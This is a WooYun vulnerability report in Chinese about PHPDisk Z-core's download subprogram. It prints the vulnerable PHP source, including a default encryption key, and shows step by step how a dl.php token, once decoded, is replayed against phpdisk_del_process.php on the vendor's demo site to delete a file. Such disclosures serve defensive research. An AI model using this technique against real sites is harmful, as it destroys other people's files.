{"id": 40081, "wybug_id": "wooyun-2015-092500", "wybug_title": "phpdisk Z-core网赚版子程序过滤不严，导致可删除文件.", "wybug_corp": "phpdisk.com", "wybug_author": "落叶飞扬", "wybug_date": "2015-01-23 10:56", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-28：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： phpdisk Z-core网赚版下载子程序(sub)过滤不严，导致可删除任意文件. 详细说明：  我们先来看子程序中phpdisk_del_process.php这个文件相关代码。\n\nparse_str(pd_encode($str,'DECODE')); 这里直接把传进来的值，解析到变量中了。但是被加密了，看似不可利用，其实不然。我们再来看dl.php。这个是最后下载页。\n\nparse_str(pd_encode(base64_decode(rawurldecode($str)),'DECODE'));这里同样是直接把传进来的值，解析到变量中。解析后有一个变量$file_id，而上面phpdisk_del_process.php这文件只需要一个$file_id就可以执行删除操作。phpdisk_del_process.php\n<?php /**#\tProject: PHPDISK File Storage Solution#\tThis is NOT a freeware, use is subject to license terms.##\tSite: http://www.phpdisk.com##\t$Id: phpdisk_del_process.php 24 2012-09-05 02:52:59Z along $##\tCopyright (C) 2008-2012 PHPDisk Team. All Rights Reserved.#*/include \"includes/commons.inc.php\";@set_time_limit(0);@ignore_user_abort(true);$server_arr = array('up'=>'上传服务器','down'=>'下载服务器','local'=>'本地服务器');$str = $_SERVER['QUERY_STRING']; //接收传进的值if($str){\tparse_str(pd_encode($str,'DECODE')); //把字符串解析到变量中。\t$pp = iconv('utf-8','gbk',$pp);\t$arr = explode('.',$pp);\t$src_file = $arr[0].get_real_ext($arr[1]);\t$thumb_file = $arr[0].'_thumb.'.$arr[1];\t$out_txt = \"删除结果：【{$server_arr[$server]}】【{$_SERVER['HTTP_HOST']}】，删除文件【{$file_name}】，文件ID:[{$file_id}]\";\t$file_extension = get_extension($file_name);\t$esp = strlen($file_extension)+1;\tif($file_extension){\t\t$file_name = substr($file_name,0,strlen($file_name)-$esp);\t}\t$rs = $db->fetch_one_array(\"select file_real_name,file_extension,file_store_path from {$tpf}files where file_id='$file_id' limit 1\"); //我们只需要一个$file_id\tif($rs){\t\t$num = @$db->result_first(\"select count(*) from {$tpf}files where file_real_name='{$rs[file_real_name]}' and file_extension='{$rs[file_extension]}' and file_name='\".$db->escape($file_name).\"' and file_store_path='{$rs[file_store_path]}'\");\t}\tif($safe){\t\tif($num==1){\t\t\tif(@unlink(PHPDISK_ROOT.$src_file)){\t\t\t\t@unlink(PHPDISK_ROOT.$thumb_file);\t\t\t\techo 'document.writeln(\"'.$out_txt.' <span class=\\\"txtblue\\\">成功</span><br>\");'.LF;\t\t\t}else{\t\t\t\techo 'document.writeln(\"'.$out_txt.' <span class=\\\"txtred\\\">失败[文件不存在或权限不足]</span><br>\");'.LF;\t\t\t\t//echo 'alert(\"'.$out_txt.' \\r\\n安全删除失败，请使用单个文件删除此文件后再使用批量删除功能1。\");'.LF;\t\t\t\t$log = '<? exit; ?> '.$out_txt.LF.'路径:'.PHPDISK_ROOT.$pp.' 时间:'.date('Y-m-d H:i:s').LF;\t\t\t\twrite_file(PHPDISK_ROOT.'system/delfile_log.php',$log,'ab');\t\t\t}\t\t}else{\t\t\techo 'document.writeln(\"'.$out_txt.' <span class=\\\"txtred\\\">失败[存在引用]</span><br>\");'.LF;\t\t\t//echo 'alert(\"'.$out_txt.' \\r\\n安全删除失败，此文件还存在其他的用户转存的文件引用，请使用非安全删除进行操作。\");'.LF;\t\t\t$log = '<? exit; ?> '.$out_txt.LF.'路径:'.PHPDISK_ROOT.$pp.' 时间:'.date('Y-m-d H:i:s').LF;\t\t\twrite_file(PHPDISK_ROOT.'system/delfile_log.php',$log,'ab');\t\t}\t}else{\t\tif($num==1){\t\t\t@unlink(PHPDISK_ROOT.$src_file);\t\t\t@unlink(PHPDISK_ROOT.$thumb_file);\t\t}\t\techo 'document.writeln(\"'.$out_txt.' <span class=\\\"txtblue\\\">成功</span><br>\");'.LF;\t}\tif($server=='up'){\t\t$db->query_unbuffered(\"delete from {$tpf}files where file_id='$file_id'\");\t\techo 'document.writeln(\"数据库记录文件ID:['.$file_id.']删除 <span class=\\\"txtblue\\\">成功</span><br>\");'.LF;\t}}else{\texit('<br> <p style=\"font-size:14px\" align=\"center\">Program is running, but error params!</p>');}?>\ndl.php\n<?php /**#\tProject: PHPDISK File Storage Solution#\tThis is NOT a freeware, use is subject to license terms.##\tSite: http://www.phpdisk.com##\t$Id: dl.php 33 2013-08-10 05:40:30Z along $##\tCopyright (C) 2008-2012 PHPDisk Team. All Rights Reserved.#*/error_reporting(0);if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {\tdefine('OS_WIN',true);\tdefine('LF',\"\\r\\n\");}else{\tdefine('OS_WIN',false);\tdefine('LF',\"\\n\");}$timestamp = time();define('PHPDISK_ROOT', dirname(__FILE__).'/');require_once(PHPDISK_ROOT.'system/settings.inc.php');define('SERVER_KEY',$settings[encrypt_key]);define('FILE_PATH',$settings[file_path]);define('IN_PHPDISK',TRUE);@set_time_limit(0);@ignore_user_abort(true);@set_magic_quotes_runtime(0);function check_ref(){\tglobal $settings;\t$arr = explode('/',$_SERVER['HTTP_REFERER']);\t$arr2 = explode('/',$settings[phpdisk_url]);\tif($_SERVER['HTTP_HOST']!='localhost'){\t\tif(!$_SERVER['HTTP_REFERER'] || $arr[2]!=$arr2[2]){\t\t\theader('Location: '.$settings[phpdisk_url]);\t\t\texit;\t\t}\t}}//check_ref();function pd_encode($string, $operation = 'ENCODE',$key = ''){\tglobal $settings;\t$ckey_length = 4;\t$key = md5($key ? $key : ($settings['encrypt_key'] ? $settings['encrypt_key'] : 'PHPDisk=Rc9o'));\t$keya = md5(substr($key, 0, 16));\t$keyb = md5(substr($key, 16, 16));\t$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d',0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);\t$result = '';\t$arr = range(0, 255);\t$rndkey = array();\tfor($i = 0; $i <= 255; $i++) {\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t}\tfor($j = $i = 0; $i < 256; $i++) {\t\t$j = ($j + $arr[$i] + $rndkey[$i]) % 256;\t\t$tmp = $arr[$i];\t\t$arr[$i] = $arr[$j];\t\t$arr[$j] = $tmp;\t}\tfor($a = $j = $i = 0; $i < $string_length; $i++) {\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $arr[$a]) % 256;\t\t$tmp = $arr[$a];\t\t$arr[$a] = $arr[$j];\t\t$arr[$j] = $tmp;\t\t$result .= chr(ord($string[$i]) ^ ($arr[($arr[$a] + $arr[$j]) % 256]));\t}\tif($operation == 'DECODE') {\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {\t\t\treturn substr($result, 26);\t\t} else {\t\t\treturn '';\t\t}\t} else {\t\treturn $keyc.str_replace('=', '', base64_encode($result));\t}}function filter_name($str){\treturn str_ireplace(array(' ','&amp;','・'),'_',$str);}function get_real_ext($file_extension){\tif($file_extension){\t\t$exts = explode(',','asp,asa,aspx,ascx,dtd,xsd,xsl,xslt,as,wml,java,vtm,vtml,jst,asr,php,php3,php4,php5,vb,vbs,jsf,jsp,pl,cgi,js,html,htm,xhtml,xml,css,shtm,cfm,cfml,shtml,bat,sh');\t\tif(in_array($file_extension,$exts)){\t\t\t$file_ext = '.txt';\t\t}\t}else{\t\t$file_ext = '.txt';\t}\treturn $file_ext;}function get_extension($name){\treturn strtolower(trim(strrchr($name, '.'), '.'));}$str = $_SERVER['QUERY_STRING'];parse_str(pd_encode(base64_decode(rawurldecode($str)),'DECODE'));if($expire_time && $expire_time<$timestamp){\theader(\"Content-Type: text/html; charset=utf-8\");\t$src_url = $settings[phpdisk_url].\"viewfile.php?file_id=$file_id\";\techo '<p>请登录原地址重新获取： <a href=\"'.$src_url.'\" target=\"_blank\">'.$src_url.'<a></p>';\techo '<p style=\"color:#ff0000\">温馨提示：此文件链接已失效，请勿非法盗链。</p>';\texit;}$pp = $pp.get_real_ext(get_extension($pp));if(!file_exists(PHPDISK_ROOT.FILE_PATH.'/'.$pp)){\theader(\"Content-Type: text/html; charset=utf-8\");\techo '<p style=\"padding:10px; font-size:12px;\">文件ID： '.$file_id.'<br>';\techo '['.$file_name.'] 文件不存在，请联系网站管理员处理。<br><br>';\techo '联系方式：'.$settings[contact_us].'</p>';}else{\t$file_name = filter_name(str_replace(\"+\", \"%20\",$file_name));\tob_end_clean();\t$ua = $_SERVER[\"HTTP_USER_AGENT\"];\tif(preg_match(\"/MSIE/i\", $ua)){\t\theader('Content-disposition: attachment;filename=\"'.iconv('utf-8','gbk',$file_name).'\"');\t}else{\t\theader('Content-disposition: attachment;filename=\"'.$file_name.'\"');\t}\theader('Content-type: application/octet-stream');\tif($settings[open_xsendfile]==2){\t\theader('X-Accel-Redirect: /'.FILE_PATH.'/'.$pp);\t}elseif($settings[open_xsendfile]==1){\t\theader('X-sendfile: ./'.FILE_PATH.'/'.$pp);\t}else{\t\theader('Content-Encoding: none');\t\theader('Content-Transfer-Encoding: binary');\t\theader('Content-length: '.$fs);\t\t@readfile('./'.FILE_PATH.'/'.$pp);\t}}exit;?>\n   漏洞证明：  我们用官方演示站http://demo.phpdisk.com/进行测试首先我们到最后下载页获取dl.php?后面的加密字符串.\n\n这个字符串是经过base64加密的，我们得先解密，解密前，我们先urlencode一下\n\n然后再base64解密\n\n我们把解密后的字符串6853zqzEKiJ752Q4u4Y1ZJ/EutvuJThmTyhtF0Cw0AsCeE6P2br9fcG+FZr4bPogDP4pCCAdRWL17kWDcXP3uxIjFIDWHnf4feLSUvQr7ooB3WUQYe7mA6lcRFduANRTTc/yf9o3OEuEg5pDzUCMo/iNGbaaTEuyDww6F4iZdNjZs6HANTqUi68kY5Y1ZRDR0X0LTsNBaK9+L75qHjRi71xSgaObQKxoRlE/WVYJ6ksIG+2dpW0YA7ybJMgOLpg2WJSuSjDnqJToS3Sm2SXIULxRJIk1R3PBp6d8rFjZ4Y7MZfxU/L+d9YItFmO/qYM5ehfYCsevoEiczaUsNvyXx0XBi27DFzcUo+rWcRFG+Y7X8z50/MXQuFkEEj0ogCfjqXHqjgfd+PMp+BqAYg00eflhxqP5aLx6nEvm4JJOdGX8bE5pfD7VOsCEXFZSu5M放到phpdisk_del_process.php后面得到地址http://demo.phpdisk.com/z/sub/phpdisk_del_process.php?6853zqzEKiJ752Q4u4Y1ZJ/EutvuJThmTyhtF0Cw0AsCeE6P2br9fcG+FZr4bPogDP4pCCAdRWL17kWDcXP3uxIjFIDWHnf4feLSUvQr7ooB3WUQYe7mA6lcRFduANRTTc/yf9o3OEuEg5pDzUCMo/iNGbaaTEuyDww6F4iZdNjZs6HANTqUi68kY5Y1ZRDR0X0LTsNBaK9+L75qHjRi71xSgaObQKxoRlE/WVYJ6ksIG+2dpW0YA7ybJMgOLpg2WJSuSjDnqJToS3Sm2SXIULxRJIk1R3PBp6d8rFjZ4Y7MZfxU/L+d9YItFmO/qYM5ehfYCsevoEiczaUsNvyXx0XBi27DFzcUo+rWcRFG+Y7X8z50/MXQuFkEEj0ogCfjqXHqjgfd+PMp+BqAYg00eflhxqP5aLx6nEvm4JJOdGX8bE5pfD7VOsCEXFZSu5M放到浏览器执行成功删除该文件\n\n   修复方案：  你懂的。   版权声明：转载请注明来源 落叶飞扬@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}